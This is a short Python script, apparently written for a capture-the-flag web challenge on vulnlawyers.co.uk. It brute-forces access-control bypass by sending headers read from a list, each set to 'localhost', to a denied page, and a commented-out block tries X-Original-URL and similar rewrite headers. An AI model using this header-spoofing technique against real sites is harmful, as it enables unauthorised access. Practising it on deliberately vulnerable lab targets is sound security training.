import requests as rq
from time import sleep

host = "http://www.vulnlawyers.co.uk/denied"
cookie = "ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSjZibkZrYnpJMmVpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI4ZTA0YTYwMDM2MDUzNjNjOTg4MDY5Yzk1YTMwMzVkNSJ9"
with open('/home/intx/ctf/header_poisoning.txt', 'r') as f:
    poison = f.readlines()

for p in poison:
    h,pl = p.split(sep=":")
    headers = {}
    headers['Cookie'] = cookie
    #headers[h] = pl[1:-1]
    headers[h] = "localhost"
    r = rq.get(host, headers=headers)
    resp = r.status_code
    if 401 != resp:
        print(h,pl)
    sleep(0.1)
"""
headers = {}
headers['Cookie'] = cookie
headers['X-Original-URL'] = '/login'
headers['X-Override-URL'] = '/login'
headers['X-Rewrite-URL'] = '/login'
headers['Referer'] = '/login'
r = rq.get(host, headers=headers)
resp = r.status_code
if 401 != resp:
    print('hola')
"""